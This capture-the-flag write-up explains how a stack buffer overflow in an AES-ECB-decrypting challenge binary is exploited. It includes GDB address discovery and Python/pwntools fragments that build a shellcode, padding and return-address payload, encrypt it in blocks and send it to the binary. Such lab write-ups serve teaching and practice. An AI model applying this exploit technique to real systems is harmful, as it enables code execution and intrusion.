# 📜 Challenge: ECB to Shellcode — Write-Up

### 🔎 Objective

Exploit a buffer overflow vulnerability in a binary that:

* Decrypts user-controlled AES-128-ECB input.
* Copies the decrypted result into a stack buffer.
* Lacks stack protections (no PIE, NX, etc.).
* Allows you to inject and execute shellcode on the stack.

---

## 🔧 Binary Analysis

### ✅ Security Properties

Checked via `checksec /challenge/vulnerable-overflow`:

```
RELRO: Full RELRO
Stack: No canary
NX: Unknown (GNU_STACK missing)
PIE: No PIE (0x400000)
Stack: Executable
RWX: Has RWX segments
SHSTK: Enabled
IBT: Enabled
Stripped: No
```

> ✅ **Conclusion**: We can execute injected shellcode on the stack! Perfect for a classic buffer overflow + shellcode exploit.

---

### 📜 Source & Behavior Overview

The `challenge()` function:

* Reads a 16-byte key from `/challenge/.key`
* Uses **AES-128-ECB** to decrypt input from `stdin`, which must be a multiple of 16 bytes
* The decrypted input is copied into local stack variables (`local_68`, `local_58`, etc.)
* Verifies that the first 8 bytes match `"VERIFIED"`
* If passed, prints the rest of the decrypted data

---

## 💣 Vulnerability

The decrypted data is copied into a **stack buffer** (`local_58`, size = 32 bytes), followed by other locals and eventually the return address.

> **Because ECB has no IV or chaining**, each 16-byte input block maps to a fixed 16-byte output block.

That means we can:

* **Control stack layout post-decryption**
* Inject a valid payload that includes:

  * Our shellcode
  * Padding
  * A fake return address to jump into our shellcode

---

## ❌ Failed Attempt (What Didn’t Work)

We first tried splitting payload into **16-byte chunks**, including shellcode and a jump address. But something was off:

* If a block was exactly 16 bytes long, OpenSSL’s default **padding** behavior would add an entire extra block (PKCS#7).
* That caused **misalignment**: the stack layout was shifted, and return address overwrite failed.

> **Lesson**: ECB block size + padding behavior must be controlled precisely.

---

## ✅ Final Working Plan

### 🧠 Stack Layout Discovery

We needed to **find the exact address** of the stack buffer.

**Steps:**

1. Open GDB:

   ```bash
   gdb /challenge/vulnerable-overflow
   ```

2. Break at function prologue:

   ```gdb
   break *0x4014c1   # after push rbp; mov rbp, rsp
   run
   ```

3. Print RBP:

   ```gdb
   info registers rbp
   # Example: rbp = 0x7fffffffe9d0
   ```

4. Use objdump to find buffer offset:

   ```c
   local_58[32]; // at RBP - 0x60
   ```

5. Final buffer address:

   ```bash
   0x7fffffffe9d0 - 0x60 = 0x7fffffffe970
   ```

---

## 🛠 Exploit Steps

### 1. Build Payload

```python
offset = 96  # total size to reach return address
```

**Payload = shellcode + padding + return address**

* Shellcode from `shellcode.bin`
* Padding with `'A'`s
* Jump address = `0x7fffffffe970` (shellcode buffer)

```python
payload = shellcode + b"A" * (offset - len(shellcode))
blocks = [payload[i:i+16] for i in range(0, len(payload), 16)]
blocks.append(b"A"*8 + p64(buffer_addr))
```

### 2. ECB-Encrypt Each Block

```python
for i, block in enumerate(blocks):
    with open(f"block_{i}.in", "wb") as f:
        f.write(block)
    subprocess.run(f"/challenge/dispatch < block_{i}.in > block_{i}.out", shell=True)
```

* `dispatch` encrypts each block using AES-ECB
* Resulting ciphertext is 16-byte aligned

### 3. Fix Output Stitching

For ECB mode:

* First ciphertext block: `block_data[:32]` (header)
* Rest: `block_data[16:32]`

```python
if i == 0:
    ciphertext += block_data[:32]
else:
    ciphertext += block_data[16:32]
```

### 4. Send Final Ciphertext

```python
p = process("/challenge/vulnerable-overflow")
p.send(ciphertext)
p.interactive()
```

---

## 🏁 Outcome

* Payload passed `"VERIFIED"` check
* Overwrote return address with shellcode buffer address
* Shellcode executed successfully
* Revealed the flag from inside the binary

---

## 🧠 Key Takeaways

| Lesson                     | Description                                                          |
| -------------------------- | -------------------------------------------------------------------- |
| AES-ECB predictable        | Each 16-byte block maps independently — great for code injection     |
| Padding is tricky          | Avoid full 16-byte blocks unless you want 16-byte PKCS#7 padding     |
| Use GDB + objdump together | GDB shows runtime values, objdump shows offsets — both are essential |
| Stack is executable        | Rare nowadays, but perfect for old-school shellcode                  |


